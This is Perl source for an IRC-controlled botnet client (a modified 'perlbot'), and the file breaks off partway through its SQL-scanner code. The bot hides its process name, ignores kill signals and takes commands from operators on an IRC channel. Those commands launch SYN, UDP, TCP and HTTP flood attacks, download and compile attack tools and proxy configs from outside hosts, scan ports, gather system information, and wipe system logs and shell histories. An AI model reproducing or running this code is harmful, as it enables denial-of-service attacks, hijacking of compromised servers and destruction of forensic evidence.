#!/usr/bin/perl 

#################################### 

# Design By Lupu

#-[Zr Commands List]- 

#-----[Hacking Based]----- 

# -zr @multiscan <vuln> <dork> 

# -zr @socks5 

# -zr @sql2 <vuln> <dork> <col> 

# -zr @portscan <ip> 

# -zr @logcleaner 

# -zr @sendmail <subject> <sender> <recipient> <message> 

# -zr @system 

# -zr @cleartmp 

# -zr @rootable 

# -zr @nmap <ip> <beginport> <endport> 

# -zr @back <ip><port>   

# -zr @linuxhelp 

# -zr @cd tmp:. | for example 

#-----[Advisory-New Based]----- 

# -zr @packetstorm 

# -zr @milw0rm 

#-----[DDos Based]----- 

# -zr @udpflood <host> <packet size> <time> 

# -zr @tcpflood <host> <port> <packet size> <time> 

# -zr @httpflood <host> <time> 

# -zr @sqlflood <host> <time> 

#-----[IRC Based]----- 

# -zr @killme   

# -zr @join #fdschannel 

# -zr @part #channel 

# -zr @reset 

# -zr @voice <who> 

# -zr @owner <who> 

# -zr @deowner <who> 

# -zr @devoice <who> 

# -zr @halfop <who> 

# -zr @dehalfop <who> 

# -zr @op <who> 

# -zr @deop <who> 

#-----[Flooding Based]----- 

# -zr @msgflood <who> 

# -zr @dccflood <who> 

# -zr @ctcpflood <who> 

# -zr @noticeflood <who> 

# -zr @channelflood 

# -zr @maxiflood <who> 

#################################### 

#################################### 

my $processo = 'https'; 

my $linas_max='10'; 

my $sleep='5'; 

my $cmd=""; 

my $id=""; 

############################################ 

my @adms=("Hun"); 

my @hostauth = ("werwolf96.users.undernet.org");

my @canais=("#flood"); 

my $chanpass = "-zr"; 

##Cron 

$num = int rand(30); 

my $nick = "user" . $num . ""; 

  

#Nickname of bot  

my $ircname ='[Protection]'; 

chop (my $realname = '[Protection]-'); 

#IRC name and Realname  

$servidor='irc.mixxnet.net' unless $servidor; 

my $porta='6667';  

############################################ 

$SIG{'INT'} = 'IGNORE'; 

$SIG{'HUP'} = 'IGNORE'; 

$SIG{'TERM'} = 'IGNORE'; 

$SIG{'CHLD'} = 'IGNORE'; 

$SIG{'PS'} = 'IGNORE'; 

use IO::Socket; 

use Socket; 

use IO::Select; 

chdir("/"); 

  

#Connect 

$servidor="$ARGV[0]" if $ARGV[0]; 

$0="$processo"."\0"x16;; 

my $pid=fork; 

exit if $pid; 

die "Masalah fork: $!" unless defined($pid); 

  

our %irc_servers; 

our %DCC; 

my $dcc_sel = new IO::Select->new(); 

$sel_cliente = IO::Select->new(); 

sub sendraw { 

   if ($#_ == '1') { 

      my $socket = $_[0]; 

      print $socket "$_[1]\n"; 

  

   } else { 

      print $IRC_cur_socket "$_[0]\n"; 

   } 

} 

  

sub conectar { 

   my $meunick = $_[0]; 

   my $servidor_con = $_[1]; 

   my $porta_con = $_[2]; 

  

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", 

   PeerPort=>$porta_con) or return(1); 

   if (defined($IRC_socket)) { 

      $IRC_cur_socket = $IRC_socket; 

      $IRC_socket->autoflush(1); 

      $sel_cliente->add($IRC_socket); 

      $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con"; 

      $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con"; 

      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick; 

      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost; 

      nick("$meunick"); 

      sendraw("PASS Fuck");

      sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname"); 

      sleep 1; 

   } 

} 

  

my $line_temp; 

while( 1 ) { 

   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); } 

   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^ 

   delete($irc_servers{''}) if (defined($irc_servers{''})); 

   my @ready = $sel_cliente->can_read(0); 

   next unless(@ready); 

   foreach $fh (@ready) { 

      $IRC_cur_socket = $fh; 

      $meunick = $irc_servers{$IRC_cur_socket}{'nick'}; 

      $nread = sysread($fh, $msg, 4096); 

      if ($nread == 0) { 

         $sel_cliente->remove($fh); 

         $fh->close; 

         delete($irc_servers{$fh}); 

      } 

      @lines = split (/\n/, $msg); 

      for(my $c=0; $c<= $#lines; $c++) { 

         $line = $lines[$c]; 

         $line=$line_temp.$line if ($line_temp); 

         $line_temp=''; 

         $line =~ s/\r$//; 

         unless ($c == $#lines) { 

            parse("$line"); 

         } else { 

            if ($#lines == 0) { 

               parse("$line"); 

            } elsif ($lines[$c] =~ /\r$/) { 

               parse("$line"); 

            } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) { 

               parse("$line");  

            } else { 

               $line_temp = $line; 

            } 

         } 

      } 

   } 

} 

  

sub parse { 

   my $servarg = shift; 

   if ($servarg =~ /^PING \:(.*)/) { 

      sendraw("PONG :$1"); 

   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) { 

      my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5; 

      if ($args =~ /^\001VERSION\001$/) { 

         notice("$pn", "\001VERSION mIRC v7.25 CyberBot\001"); 

      } 

      if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) { 

         if ($onde eq "$meunick"){ 

            zr("$pn", "$args"); 

         } 

#End of Connect 

         if ($args =~ /^(\Q$meunick\E|\-zr)\s+(.*)/ ) { 

            my $natrix = $1; 

            my $arg = $2; 

            if ($arg =~ /^\!(.*)/) { 

               ircase("$pn","$onde","$1") unless ($natrix eq "-zr" and $arg =~ /^\!nick/); 

            } elsif ($arg =~ /^\@(.*)/) { 

               $ondep = $onde; 

               $ondep = $pn if $onde eq $meunick; 

               bfunc("$ondep","$1"); 

            } else { 

               zr("$onde", "$arg"); 

            } 

         } 

      } 

   } 

######################### End of prefix 

   elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) { 

      if (lc($1) eq lc($meunick)) { 

         $meunick=$4; 

         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick; 

      } 

   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) { 

      nick("$meunick|".int rand(999999)); 

   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) { 

      $meunick = $2; 

      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick; 

      $irc_servers{$IRC_cur_socket}{'nome'} = "$1"; 

      foreach my $canal (@canais) { 

         sendraw("JOIN $canal $chanpass"); 

      } 

   } 

} 

  

sub bfunc { 

   my $printl = $_[0]; 

   my $funcarg = $_[1]; 

   if (my $pid = fork) { 

      waitpid($pid, 0); 

   } else { 

      if (fork) { 

         exit; 

      } else { 

  

         if ($funcarg =~ /^killme/) { 

            sendraw($IRC_cur_socket, "QUIT :"); 

            $killd = "kill -9 ".fork; 

            system (`$killd`); 

         } 

###################### 

#                    Commands                      # 

###################### 

         if ($funcarg =~ /^commands/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@9-[BY.ZR Perl Bot Commands List]-14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Hacking Based]-----14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3multiscan <vuln> <dork>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3socks5"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3sql <vuln> <dork>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3portscan <ip>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3logcleaner"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3sendmail <subject> <sender> <recipient> <message>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3system"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3cleartmp"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3rootable"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3nmap <ip> <beginport> <endport>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3back <ip><port>");    

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3linuxhelp"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3cd tmp:. | for example"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Advisory/New Based]-----14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3packetstorm"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3milw0rm"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[DDos Based]-----14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3udpflood <host> <packet size> <time>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3udp <host> <port> <packet size> <time>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3tcpflood <host> <port> <packet size> <time>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3httpflood <host> <time>");  

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3sqlflood <host> <time>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[IRC Based]-----14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3killme");    

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3join #channel");    

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3part #channel"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3reset"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3voice <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3owner <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3deowner <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3devoice <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3halfop <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3dehalfop <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3op <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3deop <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3msgflood <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3dccflood <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3ctcpflood <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3noticeflood <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3channelflood"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3maxiflood <who> "); 

} 

  

         if ($funcarg =~ /^linuxhelp/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Linux Help]-----14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Dir where you are : pwd"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Start a Perl file : perl file.pl"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Go back from dir : cd .."); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Force to Remove a file/dir : rm -rf file/dir;ls -la"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Show all files/dir with permissions : ls -lia"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Find config.inc.php files : find / -type f -name config.inc.php"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Find all writable folders and files : find / -perm -2 -ls"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Find all .htpasswd files : find / -type f -name .htpasswd"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@ 3Find all service.pwd files : find / -type f -name service.pwd"); 

         } 

           

         if ($funcarg =~ /^help/) { 

             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Help Commands]-----14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3flooding - For IRC Flooding Help"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3irc - For IRC Bot Command Help "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3ddos - For DDos Command Help"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3news - For Security News Command Help "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3hacking - For Hacking Command Help"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3linuxhelp - For Linux Help"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3extras"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3version - For version info"); 

         } 

  

         if ($funcarg =~ /^flooding/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3msgflood <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3dccflood <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3ctcpflood <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3noticeflood <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3channelflood"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3maxiflood <who> "); 

         } 

           

         if ($funcarg =~ /^irc/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[IRC Commands]-----14@12] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3voice <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3owner <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3deowner <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3devoice <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3halfop <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3dehalfop <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3op <who> "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3deop <who> "); 

         }    

           

         if ($funcarg =~ /^ddos/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Ddos Commands]-----14@12] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3udpflood <host> <packet size> <time>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3udp <host> <port> <packet size> <time>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3tcpflood <host> <port> <packet size> <time>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3httpflood <host> <time>");  

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3sqlflood <host> <time>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7[14@13-----[Extras Ddos Commands]-----14@12] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3syn <destip> <destport> <time in seconds>"); 

			sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3sudp <host> <port> <reflection file> <threads> <time> | Requires ./50 installed"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7[14@13Go to @extras to install required scripts14@12] "); 

              

         }    

  

         if ($funcarg =~ /^news/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[News Commands]-----14@12] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3packetstorm"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3milw0rm"); 

         }    

  

         if ($funcarg =~ /^hacking/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Hacking Commands]-----14@12] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3multiscan <vuln> <dork>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3socks5"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3portscan <ip>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3logcleaner"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3sendmail <subject> <sender> <recipient> <message>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3system"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3cleartmp"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3rootable"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3nmap <ip> <beginport> <endport>"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3back <ip><port>");    

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3linuxhelp"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3cd tmp:. | for example"); 

         }       

              if ($funcarg =~ /^extras/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Extras]-----14@12] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13To install these scripts you need gcc installed14@12] "); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3install-syn Syn.c");      

            sendraw($IRC_cur_socket, "PRIVMSG $printl :7-zr 14@3install-50x 50x.c");			

         }           

###################### 

#   End of  Help     # 

###################### 

  

  

###################### 

#     Commands       # 

###################### 

 if ($funcarg =~ /^system/) { 

 sendraw($IRC_cur_socket, "PRIVMSG $printl Come on and hit that ricky"); 

 } 

         if ($funcarg =~ /^sys/) { 

            $uname=`uname -a`; 

            $uptime=`uptime`; 

            $ownd=`pwd`; 

            $distro=`cat /etc/issue`; 

            $id=`id`; 

            $un=`uname -sro`; 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Info BOT : 7 Servidor :Hiden : 6667"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Uname -a     : 7 $uname"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Uptime       : 7 $uptime"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Own Prosses  : 7 $processo"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12ID           : 7 $id"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Own Dir      : 7 $ownd"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12OS           : 7 $distro"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Owner        : 7 fuck"); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Channel      : 7 #berau"); 

         } 

  

         if ($funcarg =~ /^milw0rm/) { 

            my @ltt=(); 

            my @bug=(); 

            my $x; 

            my $page=""; 

            my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return; 

            print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; 

            my @r = <$socke>; 

            $page="@r"; 

            close($socke); 

            while ($page =~  m/<title>(.*)</g){ 

               $x = $1; 

               if ($x =~ /\&lt\;/) { 

                  $x =~ s/\&lt\;/</g; 

               }          

               if ($x !~ /milw0rm/) { 

                  push (@bug,$x); 

               } 

            } 

            while ($page =~  m/<link.*expl.*([0-9]...)</g) { 

               if ($1 !~ m/milw0rm.com|exploits|en/){ 

                  push (@ltt,"http://www.milw0rm.com/exploits/$1 "); 

               } 

            } 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3milw0rm12:.4|12 Latest exploits :"); 

            foreach $x (0..(@ltt - 1)) { 

               sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3milw0rm12:.4|12  $bug[$x] - $ltt[$x]"); 

               sleep 1; 

            } 

         } 

###################### 

#   Devisings shit   # 

###################### 

####################### 

#      Version info   # 

#######################       

         if ($funcarg =~ /^version/) { 

           sendraw($IRC_cur_socket, "PRIVMSG $printl :12|4.:3Version4:.12|4 Devising's Modded perlbot v2."); 

         } 

####################### 

# End of Version info # 

#######################           

           #some links could be dead just updated there public scripts noob

           if ($funcarg =~ /^install-syn/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12|4.:3Installing Syn4:.12|4 Please wait..."); 

            system 'cd /root'; 

            system 'wget http://server.perpetual.pw/syn.c'; 

            system 'gcc -o syn syn.c -pthread'; 

            system 'rm -rf syn.c'; 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12|4.:3Installing Syn4:.12|4|--Syn is now installed and compiled :)"); 

         } 

		 

           if ($funcarg =~ /^syn\s+(.*)\s+(\d+)\s+(\d+)/) { 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3SYN DDoS12:.4|12 Attacking 4 ".$1.":".$2."12 for 4 ".$3." 12 seconds."); 

            system "cd /root"; 

            system "./syn ".$1." ".$2." ".$3." "; 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3SYN DDoS12:.4|12 Attack Finished 4"); 

         } 

		  

  

  

###################### 

#   End of Devisings # 

#        Shit        # 

###################### 

  

  

###################### 

#      Portscan      # 

###################### 

  

         if ($funcarg =~ /^portscan (.*)/) { 

            my $hostip="$1"; 

            @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555"); 

            my (@aberta, %porta_banner); 

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] Scanning for open ports on ".$1." 12 started ."); 

            foreach my $porta (@portas)  { 

               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 

                  'tcp', Timeout => 4); 

               if ($scansock) { 

                  push (@aberta, $porta); 

                  $scansock->close; 

               } 

            } 

   

            if (@aberta) { 

               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] Open ports founded: @aberta"); 

            } else { 

               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] No open ports foundend."); 

            } 

         } 

  

###################### 
#  End of  Portscan  # 

##################### 

##################### 

# Chk The News from PacketStorm# 

###################### 

if ($funcarg =~ /^packetstorm/) {  

   my $c=0; 

   my $x; 

   my @ttt=(); 

   my @ttt1=();  

   my $sock = IO::Socket::INET->new(PeerAddr=>"www.packetstormsecurity.org",PeerPort=>"80",Proto=>"tcp") or return;  

   print $sock "GET /whatsnew20.xml HTTP/1.0\r\n"; 

   print $sock "Host: www.packetstormsecurity.org\r\n"; 

   print $sock "Accept: */*\r\n"; 

   print $sock "User-Agent: Mozilla/5.0\r\n\r\n";  

   my @r = <$sock>; 

   $page="@r"; 

   close($sock); 

   while ($page =~  m/<link>(.*)<\/link>/g) 

   { 

           push(@ttt,$1); 

   } 

   while ($page =~  m/<description>(.*)<\/description>/g) 

   {  

          push(@ttt1,$1); 

   } 

   foreach $x (0..(@ttt - 1)) 

   { 

         sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3PacketStorm12] ".$ttt[$x]." ".$ttt1[$x].""); 

      sleep 3; 

      $c++; 

   } 

} 

###################### 

#Auto Install Socks V5 using Mocks# 

###################### 

if ($funcarg =~ /^socks5/) { 

  

   sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512]12 Installing Mocks please wait4"); 

      system 'cd /tmp'; 

      system 'wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz'; 

      system 'tar -xvfz mocks-0.0.2.tar.gz'; 

      system 'rm -rf mocks-0.0.2.tar.gz'; 

      system 'cd mocks-0.0.2'; 

      system 'rm -rf mocks.conf'; 

      system 'curl -O http://andromeda.covers.de/221/mocks.conf'; 

      system 'touch mocks.log'; 

      system 'chmod 0 mocks.log'; 

         sleep(2); 

      system './mocks start'; 

         sleep(4); 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512]12 Looks like its succesfully installed lets do the last things4   "); 

  

      #lets grab ip 

      $net = `/sbin/ifconfig | grep 'eth0'`; 

      if (length($net)) 

      { 

      $net = `/sbin/ifconfig eth0 | grep 'inet addr'`; 

      if (!length($net)) 

      { 

      $net = `/sbin/ifconfig eth0 | grep 'inet end.'`; 

      } 

         if (length($net)) 

      { 

         chop($net); 

         @netip = split/:/,$net; 

         $netip[1] =~ /(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/; 

         $ip = $1 .".". $2 .".". $3 .".". $4; 

           

            #and print it ^^    

            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] Connect here :4 ". $ip .":8787 "); 

         } 

      else

   { 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] IP not founded "); 

   } 

} 

else

{ 

      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] ERROR WHILE INSTALLING MOCKS "); 

} 

} 

###################### 

#        Nmap        #  

###################### 

   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){ 

         my $hostip="$1"; 

         my $portstart = "$2"; 

         my $portend = "$3"; 

         my (@abertas, %porta_banner); 

       sendraw($IRC_cur_socket, "PRIVMSG $printl : Nmap PortScan 12:. 4|  4: $1:. |.: 4Ports 12:.  4 $2-$3"); 

       foreach my $porta ($portstart..$portend){ 

               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime); 

    if ($scansock) { 

                 push (@abertas, $porta); 

                 $scansock->close; 

                 if ($xstats){ 

        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan :. |Founded  4 $porta"."/Open"); 

                 } 

               } 

             } 

             if (@abertas) { 

        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan 12:. 4| Complete "); 

             } else { 

        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan 12:. 4| No open ports have been founded  13"); 

             } 

          } 

###################### 

#    End of Nmap     #  

###################### 

###################### 

#    Log Cleaner     #  

###################### 

if ($funcarg =~ /^logcleaner/) { 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  Sorry our masters, nigga gotta big dick"); 

} 

if ($funcarg =~ /^Cleandabitch/) { 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  This process can be long, just wait"); 

    system 'rm -rf /var/log/lastlog'; 

    system 'rm -rf /var/log/wtmp'; 

   system 'rm -rf /etc/wtmp'; 

   system 'rm -rf /var/run/utmp'; 

   system 'rm -rf /etc/utmp'; 

   system 'rm -rf /var/log'; 

   system 'rm -rf /var/logs'; 

   system 'rm -rf /var/adm'; 

   system 'rm -rf /var/apache/log'; 

   system 'rm -rf /var/apache/logs'; 

   system 'rm -rf /usr/local/apache/log'; 

   system 'rm -rf /usr/local/apache/logs'; 

   system 'rm -rf /root/.bash_history'; 

   system 'rm -rf /root/.ksh_history'; 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  All default log and bash_history files erased"); 

      sleep 1; 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  Now Erasing the rest of the machine log files"); 

   system 'find / -name *.bash_history -exec rm -rf {} \;'; 

   system 'find / -name *.bash_logout -exec rm -rf {} \;'; 

   system 'find / -name "log*" -exec rm -rf {} \;'; 

   system 'find / -name *.log -exec rm -rf {} \;'; 

      sleep 1; 

sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  Done! All logs erased"); 

      } 

###################### 

# End of Log Cleaner #  

###################### 

###################### 

#              SQL SCANNER              # 

###################### 

  

if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){ 

   if (my $pid = fork) { 

      waitpid($pid, 0); 

   } else { 

      if (my $d=fork()) { 

         addproc($d,"[SQL2] $2"); 

         exit; 

      } else { 

           

         my $bug=$1; 

         my $dork=$2; 

         my $contatore=0; 

         my ($type,$space); 

